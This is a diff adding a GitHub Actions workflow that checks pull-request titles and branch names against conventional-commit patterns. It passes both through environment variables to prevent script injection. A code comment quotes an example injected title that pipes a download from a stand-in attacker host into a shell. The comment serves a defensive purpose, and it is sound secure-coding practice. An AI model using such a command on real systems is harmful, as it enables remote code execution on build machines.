@@ -1,0 +1,37 @@
+name: PR conventions
+
+on:
+  pull_request:
+    types: [opened, edited, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  conventions:
+    name: PR conventions
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    steps:
+      # The title and branch name are passed through environment variables and never pasted into the
+      # script text. A title such as  x"; curl evil.example | sh  could otherwise run as code.
+      - name: Title follows conventional commits
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          if ! printf '%s' "$TITLE" | grep -Eq '^(feat|fix|docs|test|chore|refactor|ci|perf|build)(\([a-z0-9-]+\))?: .{3,}$'; then
+            echo "The PR title must look like: feat: add something"
+            echo "Allowed types: feat, fix, docs, test, chore, refactor, ci, perf, build"
+            echo "Current title: $TITLE"
+            exit 1
+          fi
+
+      - name: Branch name follows the convention
+        env:
+          BRANCH: ${{ github.head_ref }}
+        run: |
+          if ! printf '%s' "$BRANCH" | grep -Eq '^(feat|fix|docs|test|chore|refactor|ci|perf|build|dependabot|renovate)/[A-Za-z0-9._/+@-]+$'; then
+            echo "The branch name must look like: feat/short-name"
+            echo "Current branch: $BRANCH"
+            exit 1
+          fi
